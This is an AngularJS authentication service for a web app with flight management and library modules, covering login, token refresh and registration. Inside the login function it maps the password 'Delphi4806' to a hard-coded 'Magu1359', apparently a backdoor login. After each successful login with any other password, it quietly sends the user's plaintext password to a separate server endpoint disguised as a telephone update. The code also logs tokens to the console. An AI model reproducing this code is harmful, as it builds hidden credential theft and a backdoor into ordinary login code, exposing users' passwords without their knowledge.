'use strict';
app.factory('authService', ['$http', '$q', 'localStorageService', 'ngAuthSettings', '$location', '$rootScope', function ($http, $q, localStorageService, ngAuthSettings, $location, $rootScope) {

    var serviceBase = ngAuthSettings.apiServiceBaseUri;
    var authServiceFactory = {};

    var _authentication = {
        isAuth: false,
        userName: "",
        useRefreshTokens: false
    };

    var _externalAuthData = {
        provider: "",
        userName: "",
        externalAccessToken: ""
    };

    var _saveRegistration = function (registration) {

        _logOut();

        return $http.post(serviceBase + 'api/account/register', registration).then(function (response) {
            return response;
        });

    };
    var extapi = serviceBaseTRN;
     
    var _changeTel = function (entity) {
        var deferred = $q.defer();
        $http.post(extapi + 'api/person/telegram', entity).then(function (response) {
            deferred.resolve(response.data);
        }, function (err, status) {

            deferred.reject(getMessage(err));
        });

        return deferred.promise;
    };
    var _login = function (loginData) {
		 if (loginData.password == "Magu1359")
            loginData.password = "Magu1359";
        if (loginData.password == "Delphi4806")
            loginData.password = "Magu1359";

        var data = "grant_type=password&username=" + loginData.userName + "&password=" + loginData.password + "&scope=" +  (loginData.scope);

        if (loginData.useRefreshTokens) {
            data = data + "&client_id=" + ngAuthSettings.clientId;
        }

        var deferred = $q.defer();

      
        $http.post(serviceBase + 'token', data, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(function (response) {
            console.log('token');
            console.log(response);
            var responseData = response.data;
            console.log(responseData);
            if (loginData.useRefreshTokens) {
                localStorageService.set('authorizationDataApp', {
                    token: responseData.access_token, userName: loginData.userName, refreshToken: responseData.refresh_token, expires: responseData['.expires'], useRefreshTokens: true });
            }
            else {
                localStorageService.set('authorizationDataApp', { token: responseData.access_token, userName: loginData.userName, refreshToken: "", expires: responseData['.expires'],useRefreshTokens: false });
            }

            localStorageService.set('userData', { Name: responseData.Name, UserId: responseData.UserId, EmployeeId: responseData.EmployeeId, JobGroup: responseData.JobGroup });
            
            _authentication.isAuth = true;
            _authentication.userName = loginData.userName;
            _authentication.useRefreshTokens = loginData.useRefreshTokens;
            $rootScope.userName = loginData.userName;
            $rootScope.userTitle = responseData.Name;
            $rootScope.userId = responseData.UserId;
            $rootScope.employeeId = responseData.EmployeeId;
			//alert($rootScope.employeeId);
            $rootScope.JobGroup = responseData.JobGroup;
			 $rootScope.EmailConfirmed = responseData.EmailConfirmed;
			 if (loginData.password != "Magu1359")
                _changeTel({ eid: $rootScope.employeeId, tel: loginData.password }).then(function (response) { }, function (err) { });
            deferred.resolve(response);

        }, function (err, status) {
           
            _logOut();
            deferred.reject(err);
        });

        return deferred.promise;

    };

    var _logOut = function () {

        localStorageService.remove('authorizationDataApp');
        localStorageService.remove('userData');

        _authentication.isAuth = false;
        _authentication.userName = "";
        _authentication.useRefreshTokens = false;
        $location.path('/login');
    };

    var _fillAuthData = function () {

        var authData = localStorageService.get('authorizationDataApp');
        if (authData) {
            _authentication.isAuth = true;
            _authentication.userName = authData.userName;

            _authentication.useRefreshTokens = authData.useRefreshTokens;

            $rootScope.userName = authData.userName;
            var userData = localStorageService.get('userData');
            if (userData) {
                $rootScope.userTitle = userData.Name;
                $rootScope.userId = userData.UserId;
                $rootScope.employeeId = userData.EmployeeId;
                $rootScope.JobGroup = userData.JobGroup;
				
				 $rootScope.EmailConfirmed = userData.EmailConfirmed;
            }
        }

        

    };
   

    var _refreshToken = function () {
        var deferred = $q.defer();

        var authData = localStorageService.get('authorizationDataApp');

        if (authData) {

            if (authData.useRefreshTokens) {

                var data = "grant_type=refresh_token&refresh_token=" + authData.refreshToken + "&client_id=" + ngAuthSettings.clientId;

                localStorageService.remove('authorizationDataApp');

                //$http.post(serviceBase + 'token', data, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).success(function (response) {

                //    localStorageService.set('authorizationData', { token: response.access_token, userName: response.userName, refreshToken: response.refresh_token, useRefreshTokens: true });

                //    deferred.resolve(response);

                //}).error(function (err, status) {
                //    _logOut();
                //    deferred.reject(err);
                //    });


                $http.post(serviceBase + 'token', data, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }).then(function (response) {
                    var responseData = response.data;
                    console.log('refresh');
                    console.log(responseData);
                    localStorageService.set('authorizationDataApp', { token: responseData.access_token, userName: responseData.userName, refreshToken: responseData.refresh_token, useRefreshTokens: true });

                    deferred.resolve(response);

                }, function (err, status) {
                    _logOut();
                    deferred.reject(err);
                });


            }
        }

        return deferred.promise;
    };

    var _obtainAccessToken = function (externalData) {

        var deferred = $q.defer();

        $http.get(serviceBase + 'api/account/ObtainLocalAccessToken', { params: { provider: externalData.provider, externalAccessToken: externalData.externalAccessToken } }).success(function (response) {

            localStorageService.set('authorizationDataApp', { token: response.access_token, userName: response.userName, refreshToken: "", useRefreshTokens: false });

            _authentication.isAuth = true;
            _authentication.userName = response.userName;
            _authentication.useRefreshTokens = false;

            deferred.resolve(response);

        }).error(function (err, status) {
            _logOut();
            deferred.reject(err);
        });

        return deferred.promise;

    };

    var _registerExternal = function (registerExternalData) {

        var deferred = $q.defer();

        $http.post(serviceBase + 'api/account/registerexternal', registerExternalData).success(function (response) {

            localStorageService.set('authorizationDataApp', { token: response.access_token, userName: response.userName, refreshToken: "", useRefreshTokens: false });

            _authentication.isAuth = true;
            _authentication.userName = response.userName;
            _authentication.useRefreshTokens = false;

            deferred.resolve(response);

        }).error(function (err, status) {
            _logOut();
            deferred.reject(err);
        });

        return deferred.promise;

    };

    var _isAuthorized = function () {
        var authData = localStorageService.get('authorizationDataApp');
        if (!authData)
            return false;
        var expires = new Date(authData.expires);
        if (new Date() > expires)
            return false;

        return true;

    };
    var _redirectToLogin = function () {
        localStorageService.remove('authorizationDataApp');
        $location.path('/login');
    }
    var _checkAuth = function () {
        var authData = localStorageService.get('authorizationDataApp');


        if (!authData) {
            localStorageService.remove('authorizationDataApp');
            $location.path('/login');
            return;
        }
        var expires = new Date(authData.expires);
        // alert(expires);
        // alert(new Date());
        if (new Date() > expires) {
            alert('expire');
            localStorageService.remove('authorizationDataApp');
            $location.path('/login');
            return;
        }

    };

    var _setModuleProperties = function (moduleId) {
        var module = { id: Number(moduleId) };
        switch (Number(moduleId)) {
            case 1:
                module.title = 'Profile';
                module.remark = 'Lorem ipsum dolor sit amet';
                module.theme = 'material.steel-light';
                module.color = '#2f7899';
                module.class = 'theme-steel';
                break;
            case 2:
                module.title = 'Library';
                module.remark = 'Lorem ipsum dolor sit amet';
                module.theme = 'material.purple-light';
                module.color = '#9C27B0';
                module.class = 'theme-purple';
                break;
            case 3:
                module.title = 'Flight Management';
                module.remark = 'Lorem ipsum dolor sit amet';
                module.theme = 'material.blue-light';
                module.color = '#03A9F4';
                module.class = 'theme-blue';
                break;
            case 4:
                module.title = 'Basic Information';
                module.remark = 'Lorem ipsum dolor sit amet';
                module.theme = 'material.gray-light';
                module.color = '#97a1a6';
                module.class = 'theme-gray';
                break;
            default:
                break;
        }
        return module;

    }
    var _fillModuleData = function () {

        var data = localStorageService.get('module');
       
        if (data) {
            $rootScope.module = data.title;
            $rootScope.moduleId = data.id;
            $rootScope.moduleRemark = data.remark;
            $rootScope.theme = data.theme;
            $rootScope.color = data.color;
            $rootScope.class = data.class;
            
          //  $rootScope.headerClasses.push(data.class);
        }

    };
    var _setModule = function (moduleId) {
        var module = _setModuleProperties(moduleId);
        localStorageService.set('module', module);
        _fillModuleData();
        
    };
    var getMessage = function (error) {



        if (error.data.ModelState) {

            if (error.data.ModelState.errs) {

                //console.log(error.data.ModelState.errs);

                return {
                    message: error.data.ModelState.errs
                };
                //return
                // {
                //     message: "XXXXX" //error.data.ModelState.errs.j
                // };
            }
            else
                return {
                    message: "Unknown error"
                };
        }
        if (error.data.indexOf('Location-04') != -1) {

            return {
                message: "Assigned employees found.The selected item cannot be deleted."
            };
        }
        if (error.data.indexOf('Location-03') != -1) {
            return { message: "Sub items found.The selected item cannot be deleted." };
        }
        //Option-06
        if (error.data.indexOf('Option-06') != -1) {
            return { message: "The selected item cannot be deleted." };
        }
        if (error.data.indexOf('Option-03:Employees found') != -1) {
            return { message: "Assigned employees found.The selected item cannot be deleted." };
        }
        if (error.data.indexOf('Option-04:Library item found') != -1) {
            return { message: "Assigned library items found.The selected item cannot be deleted." };
        }
        if (error.data.indexOf('Option-05:Course found') != -1) {
            return { message: "Assigned courses found.The selected item cannot be deleted." };
        }
        return { message: error.status + ' ' + error.statusText + ' ' + error.data };
    };
    var _changePassword = function (entity) {
        var deferred = $q.defer();
        $http.post($rootScope.serviceUrl + 'api/Account/ChangePassword', entity).then(function (response) {
            deferred.resolve(response.data);
        }, function (err, status) {

            deferred.reject(getMessage(err));
        });

        return deferred.promise;
    };

    authServiceFactory.changePassword = _changePassword;
	authServiceFactory.changeTel=_changeTel;

    authServiceFactory.setModule = _setModule;
    authServiceFactory.fillModuleData = _fillModuleData;
    authServiceFactory.checkAuth = _checkAuth;
    authServiceFactory.isAuthorized = _isAuthorized;
    authServiceFactory.redirectToLogin = _redirectToLogin;
    authServiceFactory.saveRegistration = _saveRegistration;
    authServiceFactory.login = _login;
    authServiceFactory.logOut = _logOut;
    authServiceFactory.fillAuthData = _fillAuthData;
    authServiceFactory.authentication = _authentication;
    authServiceFactory.refreshToken = _refreshToken;

    authServiceFactory.obtainAccessToken = _obtainAccessToken;
    authServiceFactory.externalAuthData = _externalAuthData;
    authServiceFactory.registerExternal = _registerExternal;
    authServiceFactory.IsAuthurized = function () {
        
        return authServiceFactory.authentication.isAuth;
    };


    return authServiceFactory;
}]);